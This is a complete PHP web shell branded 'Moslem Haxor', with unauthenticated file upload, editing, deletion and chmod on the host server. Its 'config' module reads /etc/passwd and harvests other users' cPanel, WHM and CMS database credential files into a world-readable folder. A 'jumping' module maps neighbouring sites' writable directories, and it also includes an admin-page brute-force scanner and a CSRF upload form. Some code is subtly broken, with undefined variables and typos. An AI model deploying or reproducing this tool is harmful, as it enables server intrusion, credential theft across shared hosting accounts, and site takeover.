<?php
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>

<link href="" rel="stylesheet" type="text/css">
<title></title>
<style>
body{
background-position: center;    background-color:#000000; height:100%; width:99%; background-attachment: fixed; background-size:100% 100%;  background-image:url(http://www.outlanders.it/uploads/1576214224.jpg); 

font-family: "console", cursive;
font-color: white;
background-color:  #222222;
text-shadow:0px 1px 0px #333333;
}
#content tr:hover{
background-color: grey;
text-shadow:0px 0px 10px white;
}
#content .first{
background color: #444444;
}
#content .first:hover{
background-color: #444444;
text-shadow:0px 0px 1px WHITE;
}
table{
border: 4px WHITE dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: WHITE;
text-decoration: RED;
}
a:hover{
color: red;
}

</style>
</HEAD>
<font style="color:#ffffff;text-shadow:#FF0099 0px 0px 10px" size="3"> <a href="https://nolep.org/">CLICK HERE !!</a> </font>
<BODY>


<h1><center><font color="Red">&gt; ! Moslem<font color="white"> Haxor &lt;</center></H1></font>
<font color="Aqua">
<body class="  pace-done" bgcolor="Black"><div class="pace  pace-inactive"><div class="pace-progress" data-progress-text="100%" data-progress="99" style="width: 100%;">
<table width="700" border="0" cellpadding="2" cellspacing="0" align="center" color="white">
<tr><td>Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Upload Berhasil!</font><br />';
}else{
echo '<font color="red">Upload Gagal!</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Upload : <input type="file" name="file" />
<input type="submit" value="<:3" />
</form>
'.''.php_uname().'
</td></tr>';
echo "<center><a href='?dir=$dir&do=finder'>[=] Admin Finder <a href='?dir=$dir&do=csrf'>[-] CSRF Online </a><a href='?dir=$dir&do=config'>[-] Config </a><br><a href='?dir=$dir&do=jumping'>[-] Jumping </a><a href='/1337.php'>[-] Home [=]</a> <center><br>";
if($_GET['do'] == 'csrf') {
echo'      <html>
<title>CSRF HAX0R ONLINE</title>
<center><br>
<font color=red> &gt; Csrf <font color=white> Moslem &lt;
<center>
<form method="post">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/vuln.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Filedata / Fileupload / dzfile / files[] / qqfile / userfile / dll " style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value="Lock Gays!">
<center><br>
</form>';
}
if($_GET['do'] == 'config') {
    $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
    $idx = mkdir("005_config", 0777);
    $isi_htc = "Options all\nRequire None\nSatisfy Any";
    $htc = fopen("005_config/.htaccess","w");
    fwrite($htc, $isi_htc);
    while($passwd = fgets($etc)) {
        if($passwd == "" || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_config);
            foreach($user_config[1] as $user_idx) {
                $user_config_dir = "/home/$user_idx/public_html/";
                if(is_readable($user_config_dir)) {
                    $grab_config = array(
                        "/home/$user_idx/.my.cnf" => "cpanel",
                        "/home/$user_idx/.accesshash" => "WHM-accesshash",
                        "/home/$user_idx/public_html/po-content/config.php" => "Popoji",
                        "/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
                        "/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
                        "/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
                        "/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                        "/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/forum/config.php" => "phpBB",
                        "/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
                        "/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
                        "/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
                        "/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
                        "/home/$user_idx/public_html/configuration.php" => "Joomla",
                        "/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/admin/config.php" => "OpenCart",
                        "/home/$user_idx/public_html/slconfig.php" => "Sitelok",
                        "/home/$user_idx/public_html/application/config/database.php" => "Ellislab");
                    foreach($grab_config as $config => $nama_config) {
                        $ambil_config = file_get_contents($config);
                        if($ambil_config == '') {
                        } else {
                            $file_config = fopen("005_config/$user_idx-$nama_config.txt","w");
                            fputs($file_config,$ambil_config);
                        }
                    }
                }      
            }
        }  
    }
    echo "<center><a href='?dir=$dir/005_config'><font color=silver>Done</font></a></center>";
}
if($_GET['do'] == 'jumping') {
    $i = 0;
    echo "<div class='margin: 5px auto;'>";
    if(preg_match("/hsphere/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $url = str_replace(array("http://","www."), "", strtolower($url));
                $etc = "/etc/passwd";
                $f = fopen($etc,"r");
                while($gets = fgets($f)) {
                    $pecah = explode(":", $gets);
                    $user = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if(is_dir($dir_user) === true) {
                        $url_user = $dir_user."/".$url;
                        if(is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=blue>R</font>] <a href='?dir=$url_user'><font color=lavender>$url_user</font></a>";
                            if(is_writable($url_user)) {
                                $jrw = "[<font color=blue>RW</font>] <a href='?dir=$url_user'><font color=lavender>$url_user</font></a>";
                            }
                            echo $jrw."<br>";
                        }
                    }
                }
            }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
            $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
            while($getss = fgets($fp)) {
                echo $getss;
            }
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } elseif(preg_match("/vhosts/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $web_vh = "/var/www/vhosts/$url/httpdocs";
                if(is_dir($web_vh) === true) {
                    if(is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=blue>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
                        if(is_writable($web_vh)) {
                            $jrw = "[<font color=blue>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
                        }
                        echo $jrw."<br>";
                    }
                }
            }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
                  bing("ip:$ip");
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } else {
        echo "<pre>";
        $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
        while($passwd = fgets($etc)) {
            if($passwd == '' || !$etc) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach($user_jumping[1] as $user_idx_jump) {
                    $user_jumping_dir = "/home/$user_idx_jump/public_html";
                    if(is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=blue>R</font>] <a href='?dir=$user_jumping_dir'><font color=lavender>$user_jumping_dir</font></a>";
                        if(is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=blue>RW</font>] <a href='?dir=$user_jumping_dir'><font color=lavender>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if(function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents("/etc/named.conf");   
                            if($domain_jump == '') {
                                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                            } else {
                                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                foreach($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if($user_jumping_url == $user_idx_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo "<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
    }
    echo "</div>";
}if($_GET['do'] == 'finder') {
	echo '<html>
<head>
<title>Admin Finder By Moslem - Posit1ve</title>
</head>
<body bgcolor="black">
<center><font color="red"><tt>
<h1>[FIND YOUR ADMIN PAGE]</h1>
<form method ="POST" action ="<?php $PHP_SELF; ?>"></font>
<p><font color="red">Masukkan Target (Tanpa tanda "/" diakhir url target) :</p><input type="text"  size="70" name="url" value="http://target.com"/></font>
<br>
<input type="submit" name="submit" value="Find It Admin"/>
<br>
<br>';
function xss_protect($data, $strip_tags = false, $allowed_tags =""){
	if($strip_tags){
		$data = strip_tags($dara, $allowed_tags. "<b>");
	}
	if(stripos($data, "script") !== false){
		$result = str_replace("script","scr<b></b>ipt",htmlentities($data, ENT_QUOTES));
	}else{
		$result = htmlentities($data, ENT_QUOTES);
	}
	return $result;
}
function urlExist($url){
$handle = curl_init($url);
if(false === $handle)
{
	return false;
}
curl_setopt($handle, CURLOPT_HEADER, false);
curl_setopt($handle, CURLOPT_FAILONERROR, true);
curl_setopt($handle, CURLOPT_HEADER, array("User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15"));
curl_setopt($handle, CURLOPT_NOBODY, true);
curl_setopt($handle, CURLOPT_RETURNTRANSFER, false);
$connectable = curl_exec($handle);
curl_close($handle);
return $connectable;
}
if(isset($_POST['url']))
	{
	$url = htmlentities(xss_protect($_POST['url']));
	if(filter_var($url, FILTER_VALIDATE_URL))
	{
	$trying = array("admin","administrator","adm","login","login.php","administrator.php","admins.php","logins","admincp", "admincp.php","admin1.php", "admin1.html", "admin2.php", "admin2.html", "yonetim.php", "yonetim.html", "yonetici.php", "yonetici.html", "ccms/", "ccms/login.php", "ccms/index.php", "maintenance/", "webmaster/", "adm/", "configuration/", "configure/", "websvn/", "admin/", "admin/account.php", "admin/account.html". "admin/index.php", "admin/index.html", "admin/login.php","admin/login.html", "admin/home.php", "admin/controlpanel.html", "admin/controlpanel.php", "admin.php", "admin.html", "admin/cp.php", "admin/cp.html", "cp.php", "cp.html", "administrator/","administrator/index.html", "administrator/index.php", "administrator/login.html", "administrator/login.php", "administrator/account.html", "administrator/account.php", "administrator.php","administrator.html", "login.php", "login.html", "modelsearch/login.php", "moderator.php", "moderator.html", "moderator/login.php", "moderator/login.html","moderator/admin.php","moderator/admin.html", "moderator/", "account.php", "account.html", "controlpanel/", "controlpanel.php", "controlpanel.html", "admincontrol.php", "admincontrol.html", "adminpanel.php","adminpanel.html", "admin1.asp", "admin2.asp", "yonetim.asp", "yonetici.asp", "admin/account.asp", "admin/index.asp", "admin/login.asp", "admin/home.asp", "admin/controlpanel.asp", "admin.asp", "admin/cp.asp", "cp.asp", "administrator/index.asp","administrator/login.asp","administrator/account.asp","administrator.asp", "login.asp", "modelsearch/login.asp", "moderator.asp","moderator/login.asp", "moderator/admin.asp", "account.asp", "controlpanel.asp", "admincontrol.asp", "adminpanel.asp", "fileadmin/", "fileadmin.php", "fileadmin.asp", "fileadmin.html","administration/", "administration.php", "administration.html", "sysadmin.php", "sysadmin.html", "phpmyadmin/", "myadmin/", "sysadmin.asp", "sysadmin/", "ur-admin.asp", "ur-admin.php","ur-admin.html", "ur-admin/", "Server.php", "Server.html", "Server.asp", "Server/", "wp-admin/", "administr8.php", "administr8.html", "administr8/", "administr8.asp", "webadmin/", "webadmin.php","webadmin.asp", "webadmin.html", "administratie/", "admins/", "admins.php", "admins.asp", "admins.html", "administrivia/", "Database_Administration/", "WebAdmin/", "useradmin/", "sysadmins/","admin1/", "system-administration/", "administrators/", "pgadmin/", "directadmin/", "staradmin/", "ServerAdministrator/", "SysAdmin/", "administer/", "LiveUser_Admin/", "sys-admin/", "typo3/","panel/", "cpanel/", "cPanel/", "cpanel_file/", "platz_login/", "rcLogin/", "blogindex/", "formslogin/", "autologin/", "support_login/", "meta_login/", "manuallogin/", "simpleLogin/", "loginflat/","utility_login/", "showlogin/", "memlogin/", "members/", "login-redirect/", "sub-login/", "wp-login/", "login1/", "dir-login/", "login_db/", "xlogin/", "smblogin/", "customer_login/", "UserLogin/","login-us/", "acct_login/", "admin_area/", "bigadmin/", "project-admins/", "phppgadmin/", "pureadmin/", "sql-admin/", "radmind/", "openvpnadmin/", "wizmysqladmin/", "vadmind/", "ezsqliteadmin/","hpwebjetadmin/", "newsadmin/", "adminpro/", "Lotus_Domino_Admin/", "bbadmin/", "vmailadmin/", "Indy_admin/", "ccp14admin/", "irc-macadmin/","banneradmin/","sshadmin/","phpldapadmin/","macadmin/","administratoraccounts/", "admin4_account/","admin4_colon/","radmind-1/","SuperAdmin/","AdminTools/","cmsadmin/","SysAdmin2/","globes_admin/","cadmins/","phpSQLiteAdmin/", "navSiteAdmin/","server_admin_small/","logo_sysadmin/","server/","database_administration/","power_user/", "system_administration/", "ss_vms_admin_sm/");
	foreach($trying as $sec)
	{
		$urll = $url.'/'.$sec;
		if(urlExist($urll))
		{
			echo '<p><font color="00ff00"'.$urll.' exists.<br>PAGE FOUND!!!</p></font>';
			exit;
		}else
		{
			echo '<p><font color="red">'.$urll.' does not exist.</font></p>';
		}
	}
	echo '<p><font color="red">Could not find admin page.</font></p>';
	}
	else
	{
		echo '<p><font color="red">Invalid URL entered.</font></p>';
	}
	}
	
	echo '</body>
	</html>';
}
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Done </font><br />';
}else{
echo '<font color="red">Change Permission Failed!</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="<3" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Rename Done</font><br />';
}else{
echo '<font color="red">Rename Failed</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="<3" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Change File Done</font><br />';
}else{
echo '<font color="red">Change File Failed!</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="<3" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Remove Directory Done</font><br />';
}else{
echo '<font color="red">Remove Directory Failed!</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Delete File Done.</font><br />';
}else{
echo '<font color="red">Delete File Error.</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="lime">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\">Check Here!</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\"<3\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
$size = $size.' MosHax';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="lime">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\">Check Here!</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\"<3!\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<center><br /><font color="red">Recoded by Moslem </font><br> <font color="white">Social Media : moslemhaxor@yahoo.com</font><center>




</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
</font>
